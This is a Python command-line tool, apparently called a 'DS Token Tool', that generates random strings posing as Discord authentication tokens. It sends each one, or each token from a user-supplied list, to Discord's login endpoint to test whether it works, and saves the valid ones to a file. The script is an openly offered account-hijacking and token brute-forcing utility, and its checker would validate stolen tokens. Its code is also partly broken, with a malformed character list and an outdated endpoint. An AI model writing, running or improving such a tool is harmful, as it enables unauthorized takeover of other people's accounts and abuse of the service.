import random
import os
import sys
import pyfiglet
import requests
from pathlib import Path
from rich.console import Console
console = Console()

def doing(text):
    console.print(f"[blue][*][yellow] {text}")
def done(text):
    console.print(f"[green][+][yellow] {text}")
def error(text):
    console.print(f"[red][!][yellow] {text}")

def generate():
    for i in range(int(input("tokens to generate ->"))):
        token = ""
        list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
                "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
                'p', 'q', 'r', 's', 't', 'u',
                'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
        for c in range(84):
            token += random.choice(list)
        with open("tokens.txt", 'a') as tokens:
            tokens.write(f'{token}\n')
        doing(f"[{i}] {token}")
    done("all tokens was added to tokens.txt")
    console.input("[red]PRESS ENTER TO CONTINUE")
    console.clear()
def generate_and_check():
    to_gen = input("tokens to generate ->")
    to_gen = int(to_gen)
    valid_tokens = 0
    invalid_tokens = 0
    doing("generating tokens....")
    for i in range(to_gen):
        token1 = ""
        token2 = ""
        for i in range(84):
            token1 += random.choice(chars)
        token = str(token1)
        headers={
            'Authorization': token
        }
        src = requests.get('https://discord.com/api/v6/auth/login', headers=headers)
        try:
            if src.status_code == 200:
                valid_tokens += 1
                done(f'[green][VALID][yellow] {token}')
                with open("working_tokens.txt", 'a') as true_tokens:
                    true_tokens.write(f"{token}\n")
            else:
                invalid_tokens += 1
                error(f'[red][INVALID][yellow] {token}')
        except Exception:
            error("error to contact discord.com")
    done(f"DONE\nTotal Tokens: {to_gen} | [green]Valid Tokens: {valid_tokens}[yellow] | [red]Invalid Tokens: {invalid_tokens}\nvalid tokens saved in {__file__}\\working_tokens.txt")
def check():
    file_path = console.input("[yellow]path of the tokens file (.txt):")
    if file_path != "":
        try:
            tokens = open(file_path, 'r').readlines()
            for token in tokens:
                token = str(token).replace("b'", '').replace("'", '').split("\n")
                headers={
                    'Authorization': token[0]
                }
                src = requests.get('https://discord.com/api/v6/auth/login', headers=headers)
                try:
                    if src.status_code == 200:
                        done(f'[green][VALID][yellow] {token[0]}')
                    else:
                        error(f'[red][INVALID][yellow] {token[0]}')
                except Exception as e:
                    print(e)
                    error("error to contact discord.com")
        except Exception as e:
            print(e)
            error("Insert a valid path!")
    else:
        error("Insert a valid path!")


chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789-_"
ascii_banner = """[purple]
 ______  ______ _______    _                    _______          _  
(______)/ _____|_______)  | |                  (_______)        | | 
 _     ( (____     _  ___ | |  _ _____ ____        _  ___   ___ | | 
| |   | \____ \   | |/ _ \| |_/ ) ___ |  _ \      | |/ _ \ / _ \| | 
| |__/ /_____) )  | | |_| |  _ (| ____| | | |     | | |_| | |_| | | 
|_____/(______/   |_|\___/|_| \_)_____)_| |_|     |_|\___/ \___/ \_)
[yellow]
                  [1] Only generate tokens
                  [2] generate tokens and check them
                  [3] check a list of tokens
"""

while True:
    console.print(ascii_banner)
    choose = console.input("[yellow][*] [blue]Insert an option:")
    if choose == "1":
        generate()
    elif choose == "2":
        generate_and_check()
    elif choose == "3":
        check()
    else:
        error("invalid option!")
input()